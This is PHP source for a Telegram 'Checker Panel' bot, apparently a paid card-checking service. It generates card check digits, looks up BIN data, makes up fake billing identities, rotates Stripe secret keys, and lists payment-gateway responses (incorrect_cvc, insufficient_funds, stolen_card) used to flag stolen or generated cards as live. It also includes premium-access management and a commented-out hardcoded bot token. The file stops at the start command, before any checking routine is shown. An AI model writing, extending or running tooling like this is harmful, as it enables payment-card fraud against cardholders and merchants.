<?php
//
session_start();
error_reporting(0);
set_time_limit(0);

date_default_timezone_set('America/Buenos_Aires');
$fecha = date("Y/m/d");
//flush();

header("Cache-Control: no-cache, must-revalidate"); // HTTP/1.1
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT"); // Date in the past
header("Pragma: no-cache");

include("config.php");

//------TOKEN DEL BOT MIKASA ACKERMAN--------//
//$token = "5405339405:AAG0kGkeN-8VueVsI2JCLQbHI3wYSnfoG7Y";

$website = "https://api.telegram.org/bot".$token;
$upda = json_decode(file_get_contents('php://input'), true);
$data = file_get_contents("php://input");
$json = json_decode($data, true);
$update = $json["message"];
//---------PERSONAL---------//
$id = $update["from"]["id"];
$Name = $update["from"]["first_name"];
$last = $update["from"]["last_name"];
$message_id = $update["message_id"];
$message = $update["text"];
//----------GRUPOS----------//
$chat_id = $update["chat"]["id"];
$id_new = $update["new_chat_member"]["id"];
$grupo = $update["chat"]["title"];
$nuevo = $update["new_chat_member"]["first_name"]. ' '.$update["new_chat_member"]["last_name"];
//----------------------END VARIABLES----------------------//

$user = $update["from"]["username"];
//------------seguridad-------------//
// ID de tu usuario (para permitir mensajes personales solo para ti)
$myid = "1292171163"; // Reemplaza con tu ID de usuario


//-------------------FUNCIONES------------------//


$nombres = array("Juan", "María", "Pedro", "Ana", "Carlos", "Luisa", "Jorge", "Sofía");
$nombre = $nombres[rand(0, count($nombres) - 1)];

$fn = array("@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@icloud.com", "@mail.com", "@aol.com");
$fin = $fn[rand(0, count($fn) - 1)];
$num = rand(1, 100);
$correo = "$nombre$num$fin";



// Nombres y apellidos de ejemplo
$nombres = ["Liam", "Emma", "Noah", "Olivia", "Aiden", "Sophia"];
$apellidos = ["Smith", "Johnson", "Brown", "Taylor", "Anderson", "Wilson"];
$ciudades = ["Toronto", "Vancouver", "Montreal", "Calgary", "Ottawa"];
$provincias = ["Ontario", "Quebec", "British Columbia", "Alberta", "Nova Scotia"];

// Generar datos aleatorios
$nombre = $nombres[array_rand($nombres)];
$apellido = $apellidos[array_rand($apellidos)];
$correo = strtolower($nombre) . "." . strtolower($apellido) . "".$fin."";
$telefono = "(416) " . rand(100, 999) . "-" . rand(1000, 9999);
$direccion1 = rand(100, 999) . " Main St";
$direccion2 = rand(100, 999) . " Main St";
$ciudad = $ciudades[array_rand($ciudades)];
$zip = strtoupper(chr(rand(65, 90)) . rand(0, 9) . chr(rand(65, 90)) . ' ' . rand(0, 9) . chr(rand(65, 90)) . rand(0, 9));
$provincia = $provincias[array_rand($provincias)];
// Nombres y apellidos de ejemplo
$name = $nombre;
$phone = $telefono;

function capture($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
 return $str[0];
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

function array_in_string($str, array $arr) {
    foreach($arr as $arr_value) {
        if (stripos($str,$arr_value) !== false)
    return true;
    }
    return false;
}

function Calculate($ccnumber, $length)
    {
        $sum = 0;
        $pos = 0;
        $reversedCCnumber = strrev($ccnumber);

        while ($pos < $length - 1) {
            $odd = $reversedCCnumber[$pos] * 2;
            if ($odd > 9) {
                $odd -= 9;
            }
            $sum += $odd;

            if ($pos != ($length - 2)) {

                $sum += $reversedCCnumber[$pos + 1];
            }
            $pos += 2;
        }

     //   # Calculate check digit
        $checkdigit = ((floor($sum / 10) + 1) * 10 - $sum) % 10;
        $ccnumber .= $checkdigit;
        return $ccnumber;
    }


function BinData($bin){
$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
$data = json_decode($content, true);
curl_close($curl);

// Extraer cada uno de los elementos
$iin = $data['number']['iin']; // Número IIN
$length = $data['number']['length']; // Longitud
$luhn = $data['number']['luhn']; // Luhn
$scheme = $data['scheme']; // Esquema
$type = $data['type']; // Tipo
$category = $data['category']; // Categoría
$alpha2 = $data['country']['alpha2']; // Código de país alpha2
$alpha3 = $data['country']['alpha3']; // Código de país alpha3
$country = $data['country']['name']; // Nombre del país
$emoji = $data['country']['emoji']; // Emoji del país
$bank = $data['bank']['name']; // Nombre del banco
$bankPhone = $data['bank']['phone']; // Teléfono del banco
$bankUrl = $data['bank']['url']; // URL del banco
$success = $data['success']; // Estado de éxito
$count = "".$country." - ".$alpha2." ".$emoji."";

if (empty($category)){
   $curl = curl_init('https://bincheck.io/es/details/'.$bin.'');
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
   $response = curl_exec($curl);
   curl_close($curl);
    //_Nivel de tarjeta_
   preg_match('/Nivel de tarjeta<\/td>\s*<td width="65%" class="p-2">\s*([^<]+)\s*<\/td>/', $response, $matches);
   $category = trim($matches[1]);

}

$type = trim($type);
$bank = trim($bank);


if ($type !== "" ){
$tipo = "\n➭ 𝚃𝚈𝙿𝙴: ".$type."";
}
if ($category !== "" ){
$level = "\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$category."";
}
if ($bank !== "" ){
$banco = "\n➭ 𝙱𝙰𝙽𝙺: ".$bank."";
}
$in = "<code>".$bin."</code>";
$bindata = "━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$in."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$scheme."".$tipo."".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."".$banco."";

return $bindata;
}


//-----------------------VARIABLES-------------------------//

$live_array = array(
    'incorrect_cvc',
    'Your card zip code is incorrect.',
    'The zip code you supplied failed validation.',
    '"cvc_check":"pass"',
    'Thank You.',
    '"status": "succeeded"',
    'Thank You For Donation.',
    'Success',
    'SUCCEEDED',
    '"cvc_check": "fail"',
    '"cvc_check": "pass"',
    '"status": "succeeded"',
    'Your payment has already been processed',
    'Nice! New payment method added',
    'Approved',
    'insufficient_funds',
    'Your card has insufficient funds.',
    "Your card's security code is invalid.",
    "Your card's security code is incorrect.",
    "The card's security code is incorrect.",
    "Your card's expiration month is invalid.",
    'Card Issuer Declined CVV',
    'This transaction cannot be processed. Please enter a valid Credit Card Verification Number.',
    'Insufficient Funds',
    'Transaction not permitted by issuer',
    'EXISTING_ACCOUNT_RESTRICTED',
    'VALIDATION_ERROR',
    '3DS authentication is required.',
//    'Your payment method was rejected due to 3D Secure.',
    'transaction_not_allowed',
    'CVV INVALID',
    'incorrect_zip',
    'pickup_card',
    'lost_card',
    'stolen_card',
    '"seller_message": "Payment complete."'
);
/*
$autorizados = array("1292171163");
$grupos_autorizados = array("-4274242125");
*/

if((strpos($message, "!id") === 0)||(strpos($message, "/id") === 0)||(strpos($message, ".id") === 0)){


$json = json_decode($data, true);
$group_id = $json['message']['chat']['id'];
$group_title = $json['message']['sender_chat']['title'];

$respuesta = "Nombre: ".$group_title."\n\nTU ID: <code>".$group_id."</code>";
sendMessage($chat_id,$respuesta,$message_id);

die();

}



$archivo = './app/data/Admins.json';
if (file_exists($archivo) && filesize($archivo) > 0) {
    $datos = json_decode(file_get_contents($archivo), true);
    if (count($datos) > 0) {

        $content = file_get_contents('./app/data/Admins.json');
        $data = json_decode($content, true);
        $autorizados = array_column($data, 'id');
//      $id = implode("\n", $autorizados);
    } else {
        echo "El archivo Admins.json está vacío";
    }
} else {
    echo "El archivo Admins.json no existe o está vacío";
}

$admin = "<a href='t.me/rigo_jz'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>";


//-----DATOS DE PRUEBA LOCAL--------//

/*

$chat_id = "1292171163";
$id = "1292171163";

echo "TU CCS: ";
$data = trim(fgets(STDIN));
$message = "!".$data."";
*/
///----+------------------------


// 





if ($myid == $id) {
  $tipo = "ᴀᴅᴍɪɴ";
} elseif (in_array($id, $autorizados)) {
  $tipo = "ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ";
} else {
	$tipo = "ғʀᴇᴇ ᴜsᴇʀ";
}




/*
if ($tipo == "ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ") {
// PERMITE QUE UN USUARIO PREMIUM ENVIE MENSAJES AL PV DEL BOT :V
}elseif($id == "1292171163"){
// PERMITE QUE EL DUEÑO ENVIE MENSAJES AL PV DEL BOT :V
}elseif($chat_id == '4274242125'){
// PERMITE QUE ENVIAR MENSAJES A UN GRUPO :v
            }else{
//------MENSAJE AL USUARIO------//
$contact = "<a href='t.me/rigo_jz'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>";
$respuesta = "━━━━━━━•⟮𝑁𝑎𝑧𝑢𝑛𝑎 𝑁𝑎𝑛𝑎𝑘𝑢𝑠𝑎⟯•━━━━━━━\nHola ".$name." este bot es premium y para poder acceder a el necesitas una key de autorización.\n\nAdquiérelo yaa!.\n\n".
'Telegram ➜ '.$contact.'';
sendMessage($id,$respuesta,$message_id);
//------MENSAJE PERSONAL-------//
$personal = "Hola Rigo Jimenez, ".$name." Intento Acceder a tu Bot";
sendMessage("1292171163",$personal);
die();
}
//}
*/

// Verificamos si el mensaje es personal o de grupo
if ($update["from"]["id"] == $myid || in_array($update["from"]["id"], $autorizados) || in_array($update["chat"]["id"], $autorizados)) {
	// Procesar mensaje
} else {
	// Enviar mensaje de error
	$contact = "<a href='t.me/rigo_jz'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>";
	$respuesta = "━━━━━━━•⟮𝑁𝑎𝑧𝑢𝑛𝑎 𝑁𝑎𝑛𝑎𝑘𝑢𝑠𝑎⟯•━━━━━━━\nHola ".$Name." este bot es premium y para poder acceder a el necesitas una key de autorización.\n\nAdquiérelo yaa!.\n\n".
	'Telegram ➜ '.$contact.'';
	sendMessage($chat_id,$respuesta,$message_id);
	//------MENSAJE PERSONAL-------//
        $personal = "Hola Rigo Jimenez, ".$Name." Intento Acceder a tu Bot";
        sendPv($myid, $personal);
        die();
}

if((strpos($message, "!") === 0)||(strpos($message, "/") === 0)||(strpos($message, ".") === 0)){

$timeout = 30; // Tiempo de espera en segundos
$maxMessages = 3; // Máximo de mensajes permitidos
$file = 'users.txt';
$userId = $id; // Reemplaza con la lógica para obtener el ID del usuario actual

try {
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);
    } else {
        $data = array();
    }

    if (!isset($data[$userId])) {
        $data[$userId] = array('lastSend' => 0, 'count' => 0);
    }

    $lastSend = $data[$userId]['lastSend'];
    $count = $data[$userId]['count'];
    $diff = time() - $lastSend;

    if ($diff >= $timeout) {
        $count = 0; // Resetear contador después del timeout
    }

    if ($count >= $maxMessages) {
        $respuesta = '⏳Por favor, espera ' . ($timeout - $diff) . ' segundos antes de enviar otro mensaje.';
        sendMessage($chat_id, $respuesta, $message_id);
 //       echo "$respuesta\n";
        exit;
    }

    // Envía el mensaje...
    $count++;
    $data[$userId] = array('lastSend' => time(), 'count' => $count);
    file_put_contents($file, json_encode($data));
//    echo "Mensaje enviado con éxito.\n";
} catch (Exception $e) {
    echo 'Error: ' . $e->getMessage();
    exit;
}
}



//-------EXTRAE EL SK_LIVE----//
$sk = $config['sk_keys'];
shuffle($sk);
$sec = $sk[0];



unlink("cookie.txt");



	
$file = './app/data/Admins.json';
if (strpos($message, "/vip") === 0) {
	
	if ($id == $myid){
		
	} else {
    // Mensaje de error para IDs no autorizados
		$respuesta = "Acceso restringido!!!";
		sendMessage($chat_id, $respuesta, $message_id);
		die();
	}

	$nombre = '';
	$userId = substr($message, 5);

	if ($userId == $myid) {
		$respuesta = "$userId es el Admin!";
		sendMessage($chat_id, $respuesta, $message_id);
		die();
	}
	
	if (is_numeric($userId) && $userId != '') {
		
		$url = 'https://api.telegram.org/bot' . $token . '/getChat?chat_id=' . $userId;
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$response = curl_exec($ch);
		curl_close($ch);

		$userData = json_decode($response, true);
		$type = $userData['result']['type'];

		if ($userData['ok']) {

			if ($type == "private") {
				$nombre = $userData['result']['first_name'] . ' ' . ($userData['result']['last_name'] ?? '');
				$username = $userData['result']['username'] ?? 'No tiene username';
			} elseif (in_array($type, ["group", "supergroup", "channel"])) {
				$nombre = $userData['result']['title'];
				$username = $userData['result']['username'];
			}
		} else {
//        $respuesta = "Error: " . $userData['description'];
			$respuesta = "Usuario no encontrado!!!";
			sendMessage($chat_id, $respuesta, $message_id);
			die();
		}



   // if (is_numeric($userId) && $userId != '') {

		$usersFile = fopen($file, 'r+');
		$usersData = json_decode(fread($usersFile, filesize($file)), true);

		$usersData[$userId] = [
			'id' => $userId,
			'type' => $type,
			'name' => $nombre,
			'username' => $username,
			'premium' => true
			];
		ftruncate($usersFile, 0);
		rewind($usersFile);
		fwrite($usersFile, json_encode($usersData, JSON_PRETTY_PRINT));
		$newContent = json_encode($usersData, JSON_PRETTY_PRINT);
//      echo "$newContent\n";
		Send_data($newContent);
		fclose($usersFile);

		$respuesta = "El usuario ({$userId}) ahora es premium!";
		
	} else {
		$respuesta = "Formato inválido. Use !vip xxxxx";
//echo "$respuesta\n";
	}
	sendMessage($chat_id, $respuesta, $message_id);
	die();
}



function Send_data($newContent) {
    unlink('./app/data/Admins.json');

    $api_token = file_get_contents('/etc/secrets/API_TOKEN');
    $repoName = 'r1gox/CheckerBot';
    $filePath = 'CheckerBot/public/app/data/Admins.json';

    $url = 'https://api.github.com/repos/' . $repoName . '/contents/' . $filePath;
    $headers = array(
        'Authorization: Bearer ' . $api_token,
        'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36'
    );

    // Obtener el SHA del archivo existente
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    curl_close($ch);
    $fileData = json_decode($response, true);

    // Reemplazar el contenido del archivo
    $data = array(
        'message' => 'Actualizar archivo',
        'content' => base64_encode($newContent),
        'sha' => $fileData['sha']
    );

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($headers, ['Content-Type: application/json']));
    $response = curl_exec($ch);
    curl_close($ch);

    sendMessage($chat_id, $response, $message_id);
}

/*
function Send_data($newContent){

unlink('./app/data/Admins.json');
//$api_token = getenv('API_TOKEN');
$api_token = file_get_contents('/etc/secrets/API_TOKEN');
	
$repoName = 'r1gox/CheckerBot';
$filePath = 'CheckerBot/public/app/data/Admins.json';
//$filePath = 'Admin.json';

// Paso 1: Intentar obtener el contenido actual del archivo
$url = 'https://api.github.com/repos/' . $repoName . '/contents/' . $filePath;
$headers = array(
    'Authorization: Bearer ' . $api_token,
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36'
);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$response = curl_exec($ch);
curl_close($ch);

$fileData = json_decode($response, true);

// Paso 2: Verificar si el archivo existe
if (isset($fileData['message']) && $fileData['message'] === 'Not Found') {
    // El archivo no existe, así que lo creamos
    $data = array(
        'message' => 'Crear nuevo archivo',
        'content' => base64_encode($newContent)
    );

    // Crear el archivo
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($headers, ['Content-Type: application/json']));

    $response = curl_exec($ch);
    curl_close($ch);

    echo "Archivo creado: " . $response;

} else {
    // El archivo existe; procedemos a agregar nuevos datos
    $currentContent = base64_decode($fileData['content']);
    $currentSha = $fileData['sha'];

    // Agregar los nuevos datos
    $updatedContent = $currentContent . $newContent;

    // Preparar la solicitud para actualizar el archivo
    $data = array(
        'message' => 'Agregar más datos al archivo',
        'content' => base64_encode($updatedContent),
        'sha' => $currentSha // Necesitamos el sha para la actualización
    );

    // Actualizar el archivo
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($headers, ['Content-Type: application/json']));

    $response = curl_exec($ch);
    curl_close($ch);
    sendMessage($chat_id, $response, $message_id);
   // echo "Archivo actualizado: " . $response;
}
}
*/


/*
$file = 'Admins.json';
if (strpos($message, "/vip") === 0) {
    $nombre = '';

    $userId = substr($message, 5);
    if ($userId == $myid) {
        $respuesta = "$userId es el Admin!";
        sendMessage($chat_id, $respuesta, $message_id);
        die();

    }

   // if (is_numeric($userId) && $userId != '') {

    $url = 'https://api.telegram.org/bot' . $token . '/getChat?chat_id=' . $userId;
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    $userData = json_decode($response, true);

    if ($userData['ok']) {
        $nombre = $userData['result']['first_name'] . ' ' . ($userData['result']['last_name'] ?? '');
        $username = $userData['result']['username'] ?? 'No tiene username';
    } else {
//        $respuesta = "Error: " . $userData['description'];
        $respuesta = "Usuario no encontrado!!!";
        sendMessage($chat_id, $respuesta, $message_id);
        die();
    }



    if (is_numeric($userId) && $userId != '') {
        $usersFile = fopen($file, 'r+');
        $usersData = json_decode(fread($usersFile, filesize($file)), true);

        $usersData[$userId] = [
            'id' => $userId,
            'name' => $nombre,
            'username' => $username,
            'premium' => true
        ];

        ftruncate($usersFile, 0);
        rewind($usersFile);
        fwrite($usersFile, json_encode($usersData, JSON_PRETTY_PRINT));
        fclose($usersFile);




        $respuesta = "El usuario ({$userId}) ahora es premium!";
    } else {
        $respuesta = "Formato inválido. Use !vip xxxxx";
    }

    sendMessage($chat_id, $respuesta, $message_id);
    die();
}

*/



if (strpos($message, "/unvip") === 0) {
    $user = substr($message, 7);
    if (is_numeric($user) && $user != '') {
        $fp = fopen($file, 'r+');
        $content = fread($fp, filesize($file));
        $users = json_decode($content, true);
        unset($users[$user]);
        ftruncate($fp, 0);
        rewind($fp);
        fwrite($fp, json_encode($users, JSON_PRETTY_PRINT));
        fclose($fp);
        $respuesta = "El usuario ($user) ya no es premium.";
    } else {
        $respuesta = "Formato inválido. Use !unvip xxxxx";
    }
    sendMessage($chat_id, $respuesta, $message_id);
    die();
}





$file = file_get_contents('./app/data/Admins.json');

if (strpos($message, "!listvip") === 0) {

    $users = json_decode($file, true);
    $premiums = array_filter($users, function($user) {
        return $user['premium'];
    });

    if (count($premiums) > 0) {
        $respuesta = "♕ ᵁˢᵘᵃʳᶤᵒˢ ᴾʳᵉᵐᶤᵘᵐ ♕\n\n";
        foreach ($premiums as $id => $user) {
            $username = !empty($user['username']) ? "(@{$user['username']})" : '';
            $type = !empty($user['type']) ? " - {$user['type']}" : '';
            $respuesta .= "➩ <code>$id</code> - {$user['name']} $username$type\n";
        }
    } else {
        $respuesta = "No hay usuarios premium.";
    }

    sendMessage($chat_id, $respuesta, $message_id);
    die();
}

/*
if((strpos($message, "!vip") === 0)||(strpos($message, "/vip") === 0)||(strpos($message, ".vip") === 0))
{


$date = time();
$fn = "Admins.json";
$fp = fopen($fn, 'r+');


$ban = substr($message, 5);
//$ban = "8383838386";
if (is_numeric($ban) && ($ban != '')){
        // Lee el contenido actual del archivo
        $content = fread($fp, filesize($fn));
        $users = json_decode($content, true); // Decodifica el JSON

   $users[$ban] = array('user' => $ban, 'premium' => true);
   $ban = "<code>".$ban."</code>";
   $respuesta = "El usuario (".$ban.") ahora es premium!♕\n";
   sendMessage($chat_id,$respuesta,$message_id);

          // Vuelve al inicio del archivo y guarda los cambios
        ftruncate($fp, 0); // Limpia el archivo
        rewind($fp); // Vuelve al inicio
        fwrite($fp, json_encode($users, JSON_PRETTY_PRINT)); // Escribe el nuevo contenido
        fclose($fp); // Cierra el archivo
        die();
}else{
$respuesta = "━━━━━━━•⟮ʙaɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ban xxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();

}
}
*/

/*
$date = time();
$fn = "Admins.json";
$fp = fopen($fn, 'r+');

if($id == '1292171163'){

if((strpos($message, "!vip") === 0)||(strpos($message, "/vip") === 0)||(strpos($message, ".vip") === 0))
{

$ban = substr($message, 5);
//$ban = "8383838386";
if (is_numeric($ban) && ($ban != '')){
	// Lee el contenido actual del archivo
        $content = fread($fp, filesize($fn));
        $users = json_decode($content, true); // Decodifica el JSON

   $users[$ban] = array('user' => $ban, 'premium' => true);
   $ban = "<code>".$ban."</code>";
   $respuesta = "El usuario (".$ban.") ahora es premium!♕\n";
   sendMessage($chat_id,$respuesta,$message_id);

	  // Vuelve al inicio del archivo y guarda los cambios
        ftruncate($fp, 0); // Limpia el archivo
        rewind($fp); // Vuelve al inicio
	fwrite($fp, json_encode($users, JSON_PRETTY_PRINT)); // Escribe el nuevo contenido
	fclose($fp); // Cierra el archivo
	die();
}else{
$respuesta = "━━━━━━━•⟮ʙaɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ban xxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();

}
}


if((strpos($message, "!free") === 0)||(strpos($message, "/free") === 0)||(strpos($message, ".free") === 0)){

//$unban = "838383838";
$unban = substr($message, 6);
if (is_numeric($unban) && ($unban != '')){

   $users[$unban] = array('user' => $unban, 'premium' => false);
   $unban = "<code>".$unban."</code>";
   $respuesta = "El usuario (".$unban.") a sido bloqueado de la versión premium!\n";
   sendMessage($chat_id,$respuesta,$message_id);
   $users = json_encode($users);
   file_put_contents($fn, $users);
   fclose($fp);
die();
}else{
$respuesta = "━━━━━━━•⟮ʙaɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ban xxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}
}

}else{
$respuesta = "❌ (free: ($chat_id) ($id) Función no disponible para usuarios Free!\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}






$date = time();
$fn = "users.json";
$fp = fopen($fn, 'r+');
$users = file_get_contents($fn);
$users = json_decode($users, true);


if($id == '1292171163'){


if((strpos($message, "!ban") === 0)||(strpos($message, "/ban") === 0)||(strpos($message, ".ban") === 0))
{
$ban = substr($message, 5);
if (is_numeric($ban) && ($ban != '')){
   $users[$ban] = array('registered' => true, 'msgs' => 0, 'date' => 0, 'banned' => true);
   $ban = "<code>".$ban."</code>";
   $respuesta = "🔒 El usuario (".$ban.") a sido baneado\n";
   sendMessage($chat_id,$respuesta,$message_id);
   $users = json_encode($users);
   file_put_contents($fn, $users);
   fclose($fp);

}else{
$respuesta = "━━━━━━━•⟮ʙaɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ban xxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}
}




if((strpos($message, "!unban") === 0)||(strpos($message, "/unban") === 0)||(strpos($message, ".unban") === 0)){

$unban = substr($message, 7);
if (is_numeric($unban) && ($unban != '')){

   $users[$unban] = array('registered' => true, 'msgs' => 0, 'date' => $date, 'banned' => false);
   $unban = "<code>".$unban."</code>";
   $respuesta = "🚫 El usuario (".$unban.") a sido desbaneado\n";
   sendMessage($chat_id,$respuesta,$message_id);
   $users = json_encode($users);
   file_put_contents($fn, $users);
   fclose($fp);
//die();
}else{
$respuesta = "━━━━━━━•⟮ʙɪɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /bin xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ban xxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}
}

}else{
$respuesta = "❌ Unban: $chat_id) ($id) Función no disponible para usuarios Free!\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}


if($users[$id]['registered'] != true){
        $users[$id] = array('registered' => true, 'msgs' => 0, 'date' => $date, 'banned' => false);
    $users = json_encode($users);
    file_put_contents($fn, $users);
    $users = json_decode($users, true);
}

if($users[$id]['banned'] == true){
$respuesta = "❌ Estas baneado!\n";
sendMessage($chat_id,$respuesta,$message_id);
    fclose($fp);
    exit();
}
*/
/*
$date = time();
//---------------------
$users[$id]['msgs'] = $users[$id]['msgs'] + 1;
$users = json_encode($users);
file_put_contents($fn, $users);
$users = json_decode($users, true);

if($date <= $users[$id]['date'] + 30 and $users[$id]['msgs'] >= 3){
$respuesta = "[ANTI SPAM] Try again after 30s\n";
//echo "$respuesta";
sendMessage($chat_id,$respuesta,$message_id);
    exit();
}
if($date > $users[$id]['date'] + 30){
        $users[$id]['date'] = $date;
    $users[$id]['msgs'] = 0;
    $users = json_encode($users);
        file_put_contents($fn, $users);
    $users = json_decode($users, true);
}

//echo "Puedes enviar mensajes\n";
//sendMessage($id, "Ciao!");
fclose($fp);
*/
/*
$date = time();
static $users = array();

if (!isset($users[$id])) {
    $users[$id] = ['date' => 0, 'msgs' => 0];
}

$users[$id]['msgs']++;
$users[$id]['date'] = $date;

if ($date <= $users[$id]['date'] + 30 && $users[$id]['msgs'] >= 3) {
    $respuesta = "[ANTI SPAM] Try again after 30s\n";
    sendMessage($chat_id, $respuesta, $message_id);
    exit();
}

if ($date > $users[$id]['date'] + 30) {
    $users[$id]['date'] = $date;
    $users[$id]['msgs'] = 0;
}*/



//Almacenar los tiempos de mensajes en la sesión
//Almacenar los tiempos de mensajes en la sesión
if (!isset($_SESSION['message_times'])) {
    $_SESSION['message_times'] = [];
}

// Obtener actualizaciones

//if (isset($upda['message'])) {
  //  $chat_id = $json['message']['chat']['id'];

    // Inicializar el registro de mensajes para el usuario si no existe
    if (!isset($_SESSION['message_times'][$chat_id])) {
        $_SESSION['message_times'][$chat_id] = [];
    }

    // Filtrar mensajes antiguos (más de 30 segundos)
    $_SESSION['message_times'][$chat_id] = array_filter(
        $_SESSION['message_times'][$chat_id],
        function ($timestamp) {
            return time() - $timestamp < 30; // Mantener solo los mensajes dentro de los últimos 30 segundos
        }
    );

    // Verificar cuántos mensajes ha enviado el usuario en los últimos 30 segundos
    if (count($_SESSION['message_times'][$chat_id]) >= 2) {
       $respuesta = "⏳ Has alcanzado el límite de mensajes. Espera 30 segundos antes de enviar más.";
       sendMessage($chat_id,$respuesta,$message_id);
//       echo "$respuesta\n";
      return;
    }

    // Agregar el nuevo mensaje a la lista de tiempos
    $_SESSION['message_times'][$chat_id][] = time();

    // Responder al mensaje del usuario
//    $respuesta = "😊 Tu mensaje ha sido recibido.";
//    sendMessage($chat_id,$respuesta,$message_id);
//}







//-----BIENVENIDA NUEVO INTEGRANTE------//
if ($upda['message']['new_chat_members']) {
            // Persona se unió al grupo
            $respuesta = "Bienvenido $Name ($userId) al grupo $chatId!";
            sendMessageNew($chat_id,$respuesta);
        } elseif ($upda['message']['left_chat_member']) {
            // Persona salió del grupo
            $respuesta = "$userName ($userId) salió del grupo $chatId";
            sendMessageNew($chat_id,$respuesta);
}

if(trim($nuevo) != '')
{
$respuesta = "━━━━━━━━━━ × ━━━━━━━━━━\n⁕ Nazuna Nanakusa 『ﾑ』⁕\n\n     ⚠️ 𝙱𝙸𝙴𝙽𝚅𝙴𝙽𝙸𝙳𝙾 ⚠️\n\n➭ 𝚄𝚂𝙴𝚁 𝙸𝙳: ".$id_new."  ✔\n➭ 𝙽𝙾𝙼𝙱𝚁𝙴: ".$nuevo."  ✔\n➭ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾: ".$user."  ✔\n\n凸-.-凸 ".$grupo." 凸-.-凸\n━━━━━━━━━━ × ━━━━━━━━━━\n";
sendMessage($chat_id,$respuesta);
}

// Start Commands
if (strpos($message, ".start") === 0 || strpos($message, "!start") === 0 || strpos($message, "/start") === 0) {
$respuesta = "─ Checker Panel ─\n\n⁕ Registered as ➞ ".$admin."\n⁕ Use ➞ ".$update["chat"]["type"]." | ".$message1["chat"]["type"]." /cmds to show available commands.\n⁕ Bot by: $admin\n";
sendMessage($chat_id,$respuesta,$message_id);
}
// Cmds Commands
